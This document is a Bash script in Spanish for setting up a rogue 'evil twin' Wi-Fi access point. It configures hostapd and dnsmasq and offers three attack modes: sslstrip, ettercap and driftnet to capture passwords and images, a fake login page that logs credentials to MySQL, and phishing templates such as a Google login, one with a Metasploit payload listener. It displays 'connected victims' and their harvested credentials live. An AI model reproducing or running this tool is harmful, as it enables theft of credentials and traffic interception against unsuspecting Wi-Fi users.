#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
YELLOW=$(tput bold ; tput setaf 3)

if [ $(id -u) -eq 0 ]; then
    echo ""

else
  echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
  exit
fi


trap ctrl_c INT

function ctrl_c(){
    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
    rm dnsmasq.conf hostapd.conf 2>/dev/null
    rm -r iface 2>/dev/null
    find \-name datos-privados.txt | xargs rm 2>/dev/null
    sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
    iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
    ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
    tput cnorm; service network-manager restart
    exit 0
}

echo -e "${redColour}
            //\\           /\\
           //  \\         /  \\
          //    \\       /    \\
         //      \\     /      \\
        //        \\   /        \\
       //__________\|/__________\\          ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}Daniel Reyero - ${endColour}${purpleColour}Creación de un punto de acceso falso${endColour}${yellowColour})${endColour}${redColour}
        \\          /|\          //
         \\        / | \        //
          \\      /  |  \      //
           \\____/___|___\____//
                  /   \\
                 /     \\
                /       \\
               /         \\
              /___________\\
"


    sleep 1.5; counter=0
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
    sleep 1

    dependencias=("hostapd" "dnsmasq" "sslstrip" "driftnet" "airbase-ng" "ettercap" "httrack" "mysql" "gnome-terminal")

    for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
            echo -e ". . . . . . . . ${blueColour}[✔]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada"
            let counter+=1
        else
            echo -e "${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada"
        fi; sleep 0.4
    done

    if [ "$(echo $counter)" == "9" ]; then
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
        sleep 3
    else
        echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas instaladas para ejecutar este script${endColour}\n"
        tput cnorm; exit
    fi


function getCredentials(){

    activeHosts=0
    tput civis; while true; do
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
        for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
        echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
        find \-name datos-privados.txt | xargs cat 2>/dev/null
        for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
        sleep 3; clear
    done
}

mkdir -p /tmp/Wifi
mkdir -p /home/kali/Desktop/ap_falso
sleep  1
    clear; if [[ -e credenciales.txt ]]; then
        rm -rf credenciales.txt
    fi

    echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Seleccione su interfaz para ser usada para el AP falso:${endColour}"; sleep 1

    # Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
    airmon-ng start wlan0 > /dev/null 2>&1; interfaces=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2 |awk {'print $1'} |grep -v lo`
    echo $YELLOW  
    select choosed_interface in $interfaces; do
            echo -e "\nSeleccionaste: ${blueColour}$choosed_interface${endColour}"
          break;
    done;
    # checker=0; while [ $checker -ne 1 ]; do
    #   echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface

    #   for interface in $(cat iface); do
    #       if [ "$choosed_interface" == "$interface" ]; then
    #           checker=1
    #       fi
    #   done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
    # done

    rm iface 2>/dev/null
    echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Ingrese el nombre que le gustaría que se llamara su AP Wifi Falso, o presione enter para usar Fake_AP:${endColour} " && read -r use_ssid
    if [ "$use_ssid" = "" ];then
        use_ssid="Fake_AP"
        echo -e "\n${blueColour}$use_ssid Selecciono el nombre Fake_AP por defecto.${endColour}\n"
    fi
    echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
    if [ "$use_channel" = "" ];then
        use_channel="10"
        echo -e "\n${blueColour}$use_ssid Selecciono el canal 10 por defecto.${endColour}\n"
    fi
    echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
    sleep 2
    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5

    echo -e "interface=$choosed_interface\n" > hostapd.conf
    echo -e "driver=nl80211\n" >> hostapd.conf
    echo -e "ssid=$use_ssid\n" >> hostapd.conf
    echo -e "hw_mode=g\n" >> hostapd.conf
    echo -e "channel=$use_channel\n" >> hostapd.conf
    echo -e "macaddr_acl=0\n" >> hostapd.conf
    echo -e "auth_algs=1\n" >> hostapd.conf
    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

    echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
    sleep 2
    echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
    gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; hostapd hostapd.conf > /dev/null 2>&1 ; $SHELL"
    # hostapd hostapd.conf > /dev/null 2>&1 &
    sleep 6

    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
    echo -e "server=8.8.8.8\n" >> dnsmasq.conf
    echo -e "log-queries\n" >> dnsmasq.conf
    echo -e "log-dhcp\n" >> dnsmasq.conf
    echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
    echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
    sleep 1
    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
    sleep 1
    gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 ; $SHELL"
    # dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
    sleep 5
clear

echo -e "${YELLOW}Elige entre dos modos de ataque${NC}"
echo
echo -e "${redColour}POR FAVOR USE ESTA OPCIÓN RESPONSABLEMENTE.${endColour}"
echo -e "${yellowColour}1)${endColour} ${purpleColour}Se ejecutarán ettercap y sslstrip junto a una página web de login por http${endColour}"
echo -e "${yellowColour}2)${endColour} ${purpleColour}La página web está conectada a una base de datos programada en php${endColour}"
echo -e "${yellowColour}3)${endColour} ${purpleColour}Google-login${endColour}"
while true; do
echo -n " #? "
read yn
case $yn in
1 ) AIRBASE=1 ; break ;;
2 ) AIRBASE=0 ; break ;;
3 ) AIRBASE=2 ; break ;;
* ) echo -e "${RED}Opción inválida${NC}" ;;
esac
done
sleep 2
clear

echo -e "${GREEN}"

if [ "$AIRBASE" = "1" ]; then
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
pushd colorlib1.com > /dev/null 2>&1
php -S 192.168.1.1:80 > /dev/null 2>&1 &
sleep 2
popd > /dev/null 2>&1; # getCredentials

# rm -rf /var/www/html
# mkdir -p /var/www/html
# httrack https://colorlib.com/etc/lf/Login_v5/index.html -O /var/www/html

# Sslstrip
echo
echo -e "${yellowColour}[*]${endColour}${grayColour}Iniciando sslstrip...${endColour}" 

sslstrip -f -p -k -l 10000 -w /$HOME/Wifi/sslstrip.log & sslstripid=$!
sleep 2

# Ettercap
echo -e "${yellowColour}[*]${endColour}${grayColour}Iniciando ettercap...${endColour}"

gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; ettercap -p -u -T -q -w /tmp/Wifi/etter.cap -i wlan0mon & ettercapid=$! ; $SHELL"


sleep 2

# Driftnet
echo -e "${yellowColour}[*]${endColour}${grayColour}Iniciando driftnet...${endColour}"

mkdir -p "/tmp/Wifi/Images_$(date +%d%m%y)"
driftnet -i wlan0mon -a -d /tmp/Wifi/Images_$(date +%d%m%y) > /dev/null & dritnetid=$!
sleep 2



clear
echo $YELLOW
echo -e "${yellowColour}La herramienta esta ejecuta, después de que la víctima conecta y surfea sus credenciales se mostrarán en ettercap.
Ettercap también guardará su salida en ${endColour}${purpleColour}$HOME/Wifi/etter.cap${endColour}
${yellowColour}Las contraseñas capturadas se guardarán en${endColour} ${purpleColour}$HOME/Wifi/passwords.txt${endColour}
${yellowColour}Driftnet las imagenes se guardaran en ${endColour} ${purpleColour}$HOME/Wifi/driftftnetdata${endColour}"
echo
echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla.${endColour}${grayColour})...${endColour}\n${endColour}"

read junk
echo
mkdir -p $HOME/
# copiado de contraseñas obtenidas para ser guardadas
count=$(grep -c "Referer" /tmp/Wifi/etter.cap)
for i in $(seq 1 $count) 
do
  value=$(grep -a "Referer" /tmp/Wifi/etter.cap | awk -v i="$i" 'NR==i{print $2}')
  echo "$value" >> $HOME/Wifi/passwords.txt
done

if [ -f "$HOME/Wifi/passwords.txt" ]; then
   echo $GREEN "Contraseñas Guardadas !"
else
   echo $RED "Error al guardar contraseñas"
fi

cp -rf /tmp/Wifi/Images_$(date +%d%m%y) $HOME/Wifi
if [ -d "$HOME/Wifi/Images_$(date +%d%m%y)" ]; then
   echo $GREEN "Imagenes Guardadas !"
else
   echo $RED "Error al guardar contraseñas"
fi

cp -rf /tmp/Wifi/etter.cap $HOME/Wifi
if [ -f "$HOME/Wifi/etter.cap" ]; then
   echo $GREEN "Captura de Archivo Guardada !"
else
   echo $RED "Error al capturar el archivo"
fi

kill ${sslstripid} &> /dev/null
kill ${ettercapid} &> /dev/null
kill ${dritnetid} &> /dev/null
    
    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
    rm dnsmasq.conf hostapd.conf 2>/dev/null
    rm -r iface 2>/dev/null
    find \-name datos-privados.txt | xargs rm 2>/dev/null
    sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
    iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
    ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
    tput cnorm; service network-manager restart
    exit 0

fi
# SEGUNDA PARTE de pagina web

if [ "$AIRBASE" = "0" ]; then

        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
        pushd Web_BBDD > /dev/null 2>&1
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        popd > /dev/null 2>&1; # getCredentials

    service mysql start 

#   sleep 1
#   rm -rf /var/www/html
#   mkdir -p /var/www/html
  

# Mueve el archivo HTML al directorio de Apache
# sudo cp -r /home/kali/Desktop/Rogueap-eviltwin/Web_BBDD/* /var/www/html/



# Informa al usuario que la página ha sido creada
echo "Página web creada con éxito en http://10.0.0.1/"


sleep 2
#ejecuta el script de la base de datos
source bbdd.sh

sleep 2

clear
echo $YELLOW
echo "Todas las contraseñas que sean introducidas en esta página web seran guardadas en una base de datos"
echo
echo -e "Para acceder a las contraseñas almacenadas dentro de la base de datos $DB_NAME
   ${purpleColour}1.- mysql
    2.- USE $DB_NAME;
    3.- SELECT * FROM usuario;${endColour}"
echo
echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla.${endColour}${grayColour})...${endColour}\n${endColour}"

read junk
    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
    rm dnsmasq.conf hostapd.conf 2>/dev/null
    rm -r iface 2>/dev/null
    find \-name datos-privados.txt | xargs rm 2>/dev/null
    sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
    iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
    ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
    tput cnorm; service network-manager restart
    exit 0
fi


if [ "$AIRBASE" = "2" ]; then


        # Array de plantillas
    plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

    tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
    echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar: 1.- google-login 2.-cliqq-payload ${endColour} " && read template

    check_plantillas=0; for plantilla in "${plantillas[@]}"; do
        if [ "$template" == "1" ]; then
            check_plantillas=1
        fi
    done

    if [ "$template" == "2" ]; then
        check_plantillas=2
    fi

    if [ $check_plantillas -eq 1 ]; then
        tput civis; pushd google-login > /dev/null 2>&1
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        popd > /dev/null 2>&1; getCredentials
    elif [ $check_plantillas -eq 2 ]; then
        tput civis; pushd cliqq-payload > /dev/null 2>&1
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
        for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
        cat msfconsole.rc
        for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
        echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
        popd > /dev/null 2>&1; getCredentials
    else
        tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Elige entre una de las dos opciones${endColour}"; sleep 1
    fi


fi

echo "

    Gracias por usar esta herramienta, Buena Suerte..."
echo $RED
echo By Daniel Reyero
exit
